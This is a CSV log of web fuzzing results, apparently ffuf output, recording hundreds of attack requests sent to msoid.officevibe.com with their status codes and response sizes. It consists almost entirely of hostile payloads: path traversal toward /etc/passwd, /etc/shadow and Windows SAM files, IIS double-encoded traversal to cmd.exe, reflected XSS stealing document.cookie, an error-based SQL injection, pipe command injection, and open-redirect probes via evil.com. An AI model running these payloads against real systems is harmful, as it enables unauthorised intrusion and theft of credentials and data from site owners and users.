FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
admin/themes/<theme>/login.php,https://msoid.officevibe.com/admin/themes/<theme>/login.php,,154365,200,155098,2967,161,text/html; charset=utf-8,26.907689ms,
//./../.../boot.ini,https://msoid.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,11.146825ms,
../.htaccess,https://msoid.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,11.363064ms,
a\..\..\muster.db,https://msoid.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,11.454462ms,
servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>,,156673,200,154967,2967,161,text/html; charset=utf-8,29.146305ms,
RSS.aspx</pre></body></html>,https://msoid.officevibe.com/RSS.aspx</pre></body></html>,,156702,200,154968,2967,161,text/html; charset=utf-8,92.857129ms,
./../../../../../../../../../../etc/passwd,https://msoid.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,11.255941ms,
../etc/passwd,https://msoid.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,13.84336ms,
#/../console,https://msoid.officevibe.com/#/../console,https://www.office.com/login#,162227,302,146,6,4,text/html; charset=utf-8,42.215314ms,
phpmyvistes.php/AAA/B<script>alert(document.location)</script>,https://msoid.officevibe.com/phpmyvistes.php/AAA/B<script>alert(document.location)</script>,,164846,200,154968,2967,161,text/html; charset=utf-8,48.415178ms,
../../../apache/logs/access.log,https://msoid.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,11.150331ms,
#/../manager/text,https://msoid.officevibe.com/#/../manager/text,https://www.office.com/login#,168130,302,146,6,4,text/html; charset=utf-8,34.404889ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://msoid.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,11.038438ms,
./../../../../../../../../../../etc/shadow,https://msoid.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,11.207858ms,
start.cgi/%3Cscript%3Ealert('XSS');%3C/script%3E,https://msoid.officevibe.com/start.cgi/%3Cscript%3Ealert('XSS');%3C/script%3E,,170634,200,155099,2967,161,text/html; charset=utf-8,44.390955ms,
servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>,,171248,200,154967,2967,161,text/html; charset=utf-8,26.045284ms,
lang/chinese.php<br>,https://msoid.officevibe.com/lang/chinese.php<br>,,171689,200,154968,2967,161,text/html; charset=utf-8,85.459083ms,
..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._,https://msoid.officevibe.com/..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._,,172021,403,312,17,7,text/html; charset=us-ascii,42.883036ms,
../config.dat,https://msoid.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,11.231565ms,
../apache/logs/access.log,https://msoid.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,11.990058ms,
../www,https://msoid.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,11.309735ms,
msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,175429,403,312,17,7,text/html; charset=us-ascii,20.398473ms,
..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._,https://msoid.officevibe.com/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._,,176610,403,312,17,7,text/html; charset=us-ascii,40.049686ms,
?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://msoid.officevibe.com/?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,,177755,200,188782,4938,168,text/html; charset=utf-8,125.474154ms,
../config.asp,https://msoid.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,11.217387ms,
./.././..//etc/passwd,https://msoid.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,11.134572ms,
<script>alert('Vulnerable')</script>.stm,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.stm,,181378,200,154968,2967,161,text/html; charset=utf-8,87.637582ms,
hongcms_3.0.0_free/index.php/abou<img,https://msoid.officevibe.com/hongcms_3.0.0_free/index.php/abou<img,,181786,200,154967,2967,161,text/html; charset=utf-8,63.008544ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://msoid.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,11.503409ms,
start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,https://msoid.officevibe.com/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,,184645,200,154967,2967,161,text/html; charset=utf-8,28.333469ms,
rss.aspx</pre></body></html>,https://msoid.officevibe.com/rss.aspx</pre></body></html>,,185472,200,154968,2967,161,text/html; charset=utf-8,335.259752ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://msoid.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,11.234218ms,
../.htpasswd,https://msoid.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,11.700899ms,
Ruecr1ty.com</a>,https://msoid.officevibe.com/Ruecr1ty.com</a>,,187395,200,154967,2967,161,text/html; charset=utf-8,25.823928ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://msoid.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,11.661878ms,
_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,189467,403,312,17,7,text/html; charset=us-ascii,17.399112ms,
?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://msoid.officevibe.com/?targetURL=https://www.owler.com/iaApp/getDataCard.htm,,190572,200,188788,4938,168,text/html; charset=utf-8,85.932953ms,
gadmin/index.php</font></p>,https://msoid.officevibe.com/gadmin/index.php</font></p>,,190819,200,154968,2967,161,text/html; charset=utf-8,54.890735ms,
<script>alert('Vulnerable')</script>.thtml,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.thtml,,191390,200,154968,2967,161,text/html; charset=utf-8,49.504463ms,
index.php/%22%3C/a%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,https://msoid.officevibe.com/index.php/%22%3C/a%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,,191641,200,154968,2967,161,text/html; charset=utf-8,47.875437ms,
../..//etc/passwd,https://msoid.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,11.687586ms,
servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>,,194564,200,154968,2967,161,text/html; charset=utf-8,52.160176ms,
soapserver.php/1%3CScRiPt%3Eprompt(923395)%3C/ScRiPt%3E,https://msoid.officevibe.com/soapserver.php/1%3CScRiPt%3Eprompt(923395)%3C/ScRiPt%3E,,197842,200,154968,2967,161,text/html; charset=utf-8,90.270226ms,
6.0.0.0/login,https://msoid.officevibe.com/6.0.0.0/login,,197955,200,155240,2980,165,text/html; charset=utf-8,48.831603ms,
#/../html,https://msoid.officevibe.com/#/../html,https://www.office.com/login#,198439,302,146,6,4,text/html; charset=utf-8,81.544832ms,
..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam,https://msoid.officevibe.com/..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam,,199062,403,312,17,7,text/html; charset=us-ascii,39.378161ms,
<script>alert('Vulnerable')</script>.shtm,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.shtm,,200502,200,154968,2967,161,text/html; charset=utf-8,48.4643ms,
static/../../../../windows/win.ini,https://msoid.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,11.670841ms,
index.php/user/logout/</pre></body></html>,https://msoid.officevibe.com/index.php/user/logout/</pre></body></html>,,201868,200,154967,2967,161,text/html; charset=utf-8,44.054604ms,
%2e%2e//google.com,https://msoid.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,15.66701ms,
"node/view/666\""><script>alert(document.domain)</script>","https://msoid.officevibe.com/node/view/666\""><script>alert(document.domain)</script>",,203340,200,154968,2967,161,text/html; charset=utf-8,94.656369ms,
../../../..//etc/passwd;index.html,https://msoid.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,16.496005ms,
#/../www,https://msoid.officevibe.com/#/../www,https://www.office.com/login#,203527,302,146,6,4,text/html; charset=utf-8,75.321004ms,
#/../manager/html,https://msoid.officevibe.com/#/../manager/html,https://www.office.com/login#,205028,302,146,6,4,text/html; charset=utf-8,19.659876ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,https://msoid.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,11.733123ms,
<script>alert('Vulnerable')</script>.aspx,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.aspx,,208183,200,154968,2967,161,text/html; charset=utf-8,82.625844ms,
cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,208376,403,312,17,7,text/html; charset=us-ascii,39.946817ms,
/./../.../boot.ini,https://msoid.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,11.12869ms,
betsie/parserl.pl/<script>alert('Vulnerable')</script>;,https://msoid.officevibe.com/betsie/parserl.pl/<script>alert('Vulnerable')</script>;,,209228,200,155098,2967,161,text/html; charset=utf-8,28.452829ms,
servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>,,209744,200,154967,2967,161,text/html; charset=utf-8,29.224015ms,
../config.inc.php,https://msoid.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,11.341351ms,
"feeds/posts/default/-/<script type=""text/javascript"" src=""go.oclasrv.com","https://msoid.officevibe.com/feeds/posts/default/-/<script type=""text/javascript"" src=""go.oclasrv.com",,211825,200,154968,2967,161,text/html; charset=utf-8,91.820747ms,
~/<script>alert('XSS')</script>.aspx,https://msoid.officevibe.com/~/<script>alert('XSS')</script>.aspx,,212746,200,154967,2967,161,text/html; charset=utf-8,26.575694ms,
../manager/html,https://msoid.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,11.597769ms,
../../../../apache/logs/access.log,https://msoid.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,11.239563ms,
../admim,https://msoid.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,11.230448ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,https://msoid.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,11.314069ms,
foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd,https://msoid.officevibe.com/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd,,219295,403,312,17,7,text/html; charset=us-ascii,35.246188ms,
phamm/main.php/%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E,https://msoid.officevibe.com/phamm/main.php/%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E,,220571,200,154968,2967,161,text/html; charset=utf-8,48.736249ms,
../../../../logs/access.log,https://msoid.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,11.003019ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://msoid.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,11.106272ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://msoid.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,11.856836ms,
../../etc/passwd,https://msoid.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,11.236521ms,
static/..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,11.371252ms,
//////../../../../../../etc/passwd,https://msoid.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,11.19371ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://msoid.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,11.366443ms,
../../data/config/microsrv.cfg,https://msoid.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,11.281967ms,
msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c,https://msoid.officevibe.com/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c,,229349,403,312,17,7,text/html; charset=us-ascii,77.965234ms,
w3c/p3p.xml,https://msoid.officevibe.com/w3c/p3p.xml,,230250,200,235,39,11,text/xml; charset=utf-8,37.933332ms,
bb000001.pl<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/bb000001.pl<script>alert('Vulnerable')</script>,,233476,200,154967,2967,161,text/html; charset=utf-8,29.424487ms,
a.jsp/<script>alert('Vulnerable')</script>,https://msoid.officevibe.com/a.jsp/<script>alert('Vulnerable')</script>,,233790,200,154968,2967,161,text/html; charset=utf-8,52.067015ms,
../../..//etc/passwd;index.html,https://msoid.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,11.315434ms,
gitlab/build_now%3Csvg/onload=alert(document.domain)%3E,https://msoid.officevibe.com/gitlab/build_now%3Csvg/onload=alert(document.domain)%3E,,236577,200,154968,2967,161,text/html; charset=utf-8,101.014207ms,
../..//etc/passwd;index.html,https://msoid.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,11.032655ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,https://msoid.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,11.740648ms,
a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,https://msoid.officevibe.com/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd,,242989,403,312,17,7,text/html; charset=us-ascii,82.32202ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,11.207563ms,
../../../../../../../../../boot.ini,https://msoid.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,11.416017ms,
~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,https://msoid.officevibe.com/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,,247309,200,154967,2967,161,text/html; charset=utf-8,28.546081ms,
cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,https://msoid.officevibe.com/cgi-bin/start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,,248565,200,154968,2967,161,text/html; charset=utf-8,89.975568ms,
~/<script>alert('Vulnerable')</script>.aspx,https://msoid.officevibe.com/~/<script>alert('Vulnerable')</script>.aspx,,248814,200,154968,2967,161,text/html; charset=utf-8,46.394578ms,
../console,https://msoid.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,11.400891ms,
iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,252302,403,312,17,7,text/html; charset=us-ascii,39.12378ms,
cgi-bin/betsie/parserl.pl/<script>alert(,https://msoid.officevibe.com/cgi-bin/betsie/parserl.pl/<script>alert(,,252981,200,155099,2967,161,text/html; charset=utf-8,85.174347ms,
../../windows/win.ini,https://msoid.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,11.50866ms,
../../../administrator/inbox,https://msoid.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,11.189815ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,11.250984ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,https://msoid.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,11.232634ms,
../../../../logs/error.log,https://msoid.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,25.141413ms,
../../.htaccess,https://msoid.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,11.993949ms,
..%5c..%5c..%5cetc/passwd,https://msoid.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,11.450082ms,
../../../apache/logs/error.log,https://msoid.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,11.698061ms,
../../../..//etc/passwd,https://msoid.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,11.267819ms,
rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,268271,403,312,17,7,text/html; charset=us-ascii,32.441849ms,
index.php/admin/users/delete/<id>,https://msoid.officevibe.com/index.php/admin/users/delete/<id>,,270661,200,154968,2967,161,text/html; charset=utf-8,92.556167ms,
../logs/access.log,https://msoid.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,11.283724ms,
/evil.com/%2F..,https://msoid.officevibe.com//evil.com/%2F..,https://login.windows.net/login.srf,272876,302,152,6,4,text/html; charset=utf-8,35.114102ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,https://msoid.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,11.09548ms,
_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,274310,403,312,17,7,text/html; charset=us-ascii,74.334819ms,
<script>alert('Vulnerable')</script>.shtml,https://msoid.officevibe.com/<script>alert('Vulnerable')</script>.shtml,,275761,200,154968,2967,161,text/html; charset=utf-8,45.317229ms,
../agc/bp.pl,https://msoid.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,11.632364ms,
scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,https://msoid.officevibe.com/scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir,,278161,403,312,17,7,text/html; charset=us-ascii,39.816848ms,
../install.php,https://msoid.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,11.614832ms,
./..//etc/passwd,https://msoid.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,11.115127ms,
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,https://msoid.officevibe.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,,282407,403,312,17,7,text/html; charset=us-ascii,11.656552ms,
